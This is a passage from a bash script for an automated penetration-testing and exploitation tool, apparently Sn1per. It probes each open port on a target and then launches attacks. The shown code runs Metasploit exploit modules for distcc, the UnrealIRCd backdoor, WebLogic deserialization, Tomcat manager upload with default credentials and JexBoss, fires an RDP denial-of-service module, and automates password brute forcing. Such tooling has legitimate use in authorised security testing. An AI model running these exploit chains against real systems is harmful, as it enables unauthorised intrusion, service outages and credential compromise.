  echo -e "$OKORANGE + -- --=[Port 3310 opened... running tests...$RESET"
  nmap -A -p 3310 -Pn -T5 -sV  --script clamav-exec $TARGET
fi

if [ -z "$port_3128" ];
then
  echo -e "$OKRED + -- --=[Port 3128 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3128 opened... running tests...$RESET"
  nmap -A -p 3128 -Pn -T5 -sV  --script=*proxy* $TARGET
fi

if [ -z "$port_3389" ];
then
  echo -e "$OKRED + -- --=[Port 3389 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3389 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 --script=rdp-* -p 3389 $TARGET
  msfconsole -x "use auxiliary/scanner/rdp/ms12_020_check; setg RHOSTS \"$TARGET\"; run; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; run; back; exit;"
  rdesktop $TARGET &
fi

if [ -z "$port_3632" ];
then
  echo -e "$OKRED + -- --=[Port 3632 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 3632 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 --script=distcc-* -p 3632 $TARGET
  msfconsole -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"
fi

if [ -z "$port_4443" ];
then
  echo -e "$OKRED + -- --=[Port 4443 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 4443 opened... running tests...$RESET"
  wafw00f http://$TARGET:4443
  echo ""
  whatweb -a 3 http://$TARGET:4443
  echo ""
  sslscan --no-failed $TARGET:4443
  sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:4443
  if [ "$NIKTO" = "1" ]; then
    nikto -h https://$TARGET:4443 -output $LOOT_DIR/web/nikto-$TARGET-https-4443.txt
  fi
  if [ ${DISTRO} == "blackarch"  ]; then
    /bin/CutyCapt --url=https://$TARGET:4443 --out=$LOOT_DIR/screenshots/$TARGET-port4443.jpg --insecure --max-wait=1000 2> /dev/null
  else
    cutycapt --url=https://$TARGET:4443 --out=$LOOT_DIR/screenshots/$TARGET-port4443.jpg --insecure --max-wait=1000 2> /dev/null
  fi
  nmap -sV -Pn -A -p 4443 -T5 --script=*proxy* $TARGET
fi

if [ -z "$port_5432" ];
then
  echo -e "$OKRED + -- --=[Port 5432 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5432 opened... running tests...$RESET"
  nmap -A -sV -Pn --script=pgsql-brute -p 5432 $TARGET
  msfconsole -x "use auxiliary/scanner/postgres/postgres_login; setg RHOSTS "$TARGET"; run; exit;"
fi

if [ -z "$port_5555" ];
then
  echo -e "$OKRED + -- --=[Port 5555 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5555 opened... running tests...$RESET"
  adb connect $TARGET:5555
  adb shell pm list packages 
fi

if [ -z "$port_5800" ];
then
  echo -e "$OKRED + -- --=[Port 5800 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5800 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 --script=vnc* -p 5800 $TARGET
fi

if [ -z "$port_5900" ];
then
  echo -e "$OKRED + -- --=[Port 5900 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5900 opened... running tests...$RESET"
  nmap -A -sV  -T5 --script=vnc* -p 5900 $TARGET
  msfconsole -x "use auxiliary/scanner/vnc/vnc_none_auth; setg RHOSTS \"$TARGET\"; run; back; exit;"
fi

if [ -z "$port_5984" ];
then
  echo -e "$OKRED + -- --=[Port 5984 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 5984 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 --script=couchdb* -p 5984 $TARGET
  msfconsole -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"
fi

if [ -z "$port_6000" ];
then
  echo -e "$OKRED + -- --=[Port 6000 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 6000 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 --script=x11* -p 6000 $TARGET
  msfconsole -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;"
fi

if [ -z "$port_6667" ];
then
  echo -e "$OKRED + -- --=[Port 6667 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 6667 opened... running tests...$RESET"
  nmap -A -sV -Pn -T5 --script=irc* -p 6667 $TARGET
  msfconsole -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
fi

if [ -z "$port_7001" ];
then
  echo -e "$OKRED + -- --=[Port 7001 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 7001 opened... running tests...$RESET"
  msfconsole -x "use multi/http/oracle_weblogic_wsat_deserialization_rce; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
fi

if [ -z "$port_8000" ];
then
  echo -e "$OKRED + -- --=[Port 8000 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 8000 opened... running tests...$RESET"
  wafw00f http://$TARGET:8000
  echo ""
  whatweb -a 3 http://$TARGET:8000
  echo ""
  if [ ${DISTRO} == "blackarch"  ]; then
    /bin/CutyCapt --url=http://$TARGET:8000 --out=$LOOT_DIR/screenshots/$TARGET-port8000.jpg --insecure --max-wait=1000 2> /dev/null
  else
    cutycapt --url=http://$TARGET:8000 --out=$LOOT_DIR/screenshots/$TARGET-port8000.jpg --insecure --max-wait=1000 2> /dev/null
  fi
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8000 -T5 $TARGET
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING JEXBOSS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  cd /tmp/
  python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET:8000
  cd $INSTALL_DIR
fi

if [ -z "$port_8100" ];
then
  echo -e "$OKRED + -- --=[Port 8100 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 8100 opened... running tests...$RESET"
  wafw00f http://$TARGET:8100
  echo ""
  whatweb -a 3 http://$TARGET:8100
  echo ""
  sslscan --no-failed $TARGET:8100
  if [ ${DISTRO} == "blackarch"  ]; then
    /bin/CutyCapt --url=http://$TARGET:8100 --out=$LOOT_DIR/screenshots/$TARGET-port8100.jpg --insecure --max-wait=1000 2> /dev/null
  else
    cutycapt --url=http://$TARGET:8100 --out=$LOOT_DIR/screenshots/$TARGET-port8100.jpg --insecure --max-wait=1000 2> /dev/null
  fi
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8100 -T5 $TARGET
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING JEXBOSS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  cd /tmp/
  python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET:8100
  cd $INSTALL_DIR
fi

if [ -z "$port_8080" ];
then
  echo -e "$OKRED + -- --=[Port 8080 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 8080 opened... running tests...$RESET"
  wafw00f http://$TARGET:8080
  echo ""
  whatweb -a 3 http://$TARGET:8080
  echo ""
  sslscan --no-failed $TARGET:8080
  if [ ${DISTRO} == "blackarch"  ]; then
    /bin/CutyCapt --url=http://$TARGET:8080 --out=$LOOT_DIR/screenshots/$TARGET-port8080.jpg --insecure --max-wait=1000 2> /dev/null
  else
    cutycapt --url=http://$TARGET:8080 --out=$LOOT_DIR/screenshots/$TARGET-port8080.jpg --insecure --max-wait=1000 2> /dev/null
  fi
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING APACHE STRUTS CVE-2017-5638 VULN SCAN $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8080 -T5 $TARGET
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING APACHE STRUTS 2 REST PLUGIN XSTREAM RCE VULN CHECK $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "${OKBLUE}[*] If you see a 200 response code below, try running 'msfconsole -x \"multi/http/struts2_rest_xstream; set RHOST \"$TARGET\"; exploit -j; exit;"
  curl -I http://$TARGET:8080/struts2-rest-showcase/orders/3 -s | grep HTTP | grep 200
  curl -I http://$TARGET:8080/struts2-showcase/integration/saveGangster.action -s | grep HTTP | grep 200 
  echo -e "$OKRED RUNNING APACHE STRUTS JAKARTA RCE VULN CHECK $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "${OKBLUE}[*] If you see a 200 response code below, try running 'msfconsole -x \"multi/http/struts2_content_type_ognl; set RHOST \"$TARGET\"; exploit -j; exit;"
  curl -I http://$TARGET:8080/struts2-showcase/ -s | grep HTTP | grep 200
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING APACHE TOMCAT EXPLOITS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  msfconsole -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use admin/http/jboss_bshdeployer; run; use auxiliary/scanner/http/jboss_status; run; use admin/http/tomcat_administration; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING WILDFLY TRAVERSAL EXPLOIT $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  msfconsole -q -x "use auxiliary/scanner/http/wildfly_traversal; setg RHOSTS "$TARGET"; set RPORT 8080; run; back; exit;"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING JEXBOSS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  cd /tmp/
  python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET:8080
  cd $INSTALL_DIR
fi

if [ -z "$port_8180" ];
then
  echo -e "$OKRED + -- --=[Port 8180 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 8180 opened... running tests...$RESET"
  wafw00f http://$TARGET:8180
  echo ""
  whatweb -a 3 http://$TARGET:8180
  echo ""
  sslscan --no-failed $TARGET:8180
  sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:8180
  if [ ${DISTRO} == "blackarch"  ]; then
    /bin/CutyCapt --url=http://$TARGET:8180 --out=$LOOT_DIR/screenshots/$TARGET-port8180.jpg --insecure --max-wait=1000 2> /dev/null
  else
    cutycapt --url=http://$TARGET:8180 --out=$LOOT_DIR/screenshots/$TARGET-port8180.jpg --insecure --max-wait=1000 2> /dev/null
  fi
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180 -T5 --script=*proxy* $TARGET
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNING APACHE TOMCAT EXPLOITS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING JEXBOSS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  cd /tmp/
  python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET:8180
  cd $INSTALL_DIR
fi

if [ -z "$port_8443" ];
then
  echo -e "$OKRED + -- --=[Port 8443 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 8443 opened... running tests...$RESET"
  wafw00f http://$TARGET:8443
  echo ""
  whatweb -a 3 http://$TARGET:8443
  echo ""
  sslscan --no-failed $TARGET:8443
  sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:8443
  if [ ${DISTRO} == "blackarch"  ]; then
    /bin/CutyCapt --url=https://$TARGET:8443 --out=$LOOT_DIR/screenshots/$TARGET-port8443.jpg --insecure --max-wait=1000 2> /dev/null
  else
    cutycapt --url=https://$TARGET:8443 --out=$LOOT_DIR/screenshots/$TARGET-port8443.jpg --insecure --max-wait=1000 2> /dev/null
  fi
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8443 -T5 --script=*proxy* $TARGET
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING JEXBOSS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  cd /tmp/
  python /usr/share/sniper/plugins/jexboss/jexboss.py -u https://$TARGET:8443
  cd $INSTALL_DIR
fi

if [ -z "$port_8888" ];
then
  echo -e "$OKRED + -- --=[Port 8888 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 8888 opened... running tests...$RESET"
  wafw00f http://$TARGET:8888
  echo ""
  whatweb -a 3 http://$TARGET:8888
  echo ""
  if [ ${DISTRO} == "blackarch"  ]; then
    /bin/CutyCapt --url=https://$TARGET:8888 --out=$LOOT_DIR/screenshots/$TARGET-port8888.jpg --insecure --max-wait=1000 2> /dev/null
  else
    cutycapt --url=https://$TARGET:8888 --out=$LOOT_DIR/screenshots/$TARGET-port8888.jpg --insecure --max-wait=1000 2> /dev/null
  fi
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse  -A -p 8888 -T5 $TARGET
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING JEXBOSS $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  cd /tmp/
  python /usr/share/sniper/plugins/jexboss/jexboss.py -u http://$TARGET:8888
  cd $INSTALL_DIR
fi

if [ -z "$port_10000" ];
then
  echo -e "$OKRED + -- --=[Port 10000 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 10000 opened... running tests...$RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
fi

if [ -z "$port_16992" ];
then
  echo -e "$OKRED + -- --=[Port 16992 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 16992 opened... running tests...$RESET"
  amap $TARGET 16992 -A
  nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 $TARGET
  msfconsole -x "use auxiliary/scanner/http/intel_amt_digest_bypass; setg RHOSTS \"$TARGET\"; run; back; exit;"
fi

if [ -z "$port_27017" ];
then
  echo -e "$OKRED + -- --=[Port 27017 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 27017 opened... running tests...$RESET"
  nmap -sV -p 27017 -Pn -T5 --script=mongodb* $TARGET
fi

if [ -z "$port_27018" ];
then
  echo -e "$OKRED + -- --=[Port 27018 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 27018 opened... running tests...$RESET"
  nmap -sV  -p 27018 -Pn -T5 --script=mongodb* $TARGET
fi

if [ -z "$port_27019" ];
then
  echo -e "$OKRED + -- --=[Port 27019 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 27019 opened... running tests...$RESET"
  nmap -sV  -p 27019 -Pn -T5 --script=mongodb* $TARGET
fi

if [ -z "$port_28017" ];
then
  echo -e "$OKRED + -- --=[Port 28017 closed... skipping.$RESET"
else
  echo -e "$OKORANGE + -- --=[Port 28017 opened... running tests...$RESET"
  nmap -sV  -p 28017 -Pn -T5 --script=mongodb* $TARGET
fi

echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED SCANNING FOR COMMON VULNERABILITIES $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"
if [ ${DISTRO} == "blackarch" ]; then
  /bin/yasuo -r $TARGET -b all
else
  cd $PLUGINS_DIR/yasuo
  ruby yasuo.rb -r $TARGET -b all
fi

cd $SNIPER_DIR

if [ "$FULLNMAPSCAN" = "0" ]; then
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED SKIPPING FULL NMAP PORT SCAN $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
else
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING FULL PORT SCAN $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
fi

if [ "$AUTOBRUTE" = "0" ]; then
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED SKIPPING BRUTE FORCE $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
else
  echo -e "${OKGREEN}====================================================================================${RESET}"
  echo -e "$OKRED RUNNING BRUTE FORCE $RESET"
  echo -e "${OKGREEN}====================================================================================${RESET}"
  brutex $TARGET
  cd $INSTALL_DIR
  rm -f hydra.restore
  rm -f scan.log
  echo ""
fi

rm -f $LOOT_DIR/.fuse_* 2> /dev/null

echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED SCAN COMPLETE! $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"

if [ "$LOOT" = "1" ] && [ -z "$NOLOOT" ]; then
  loot
fi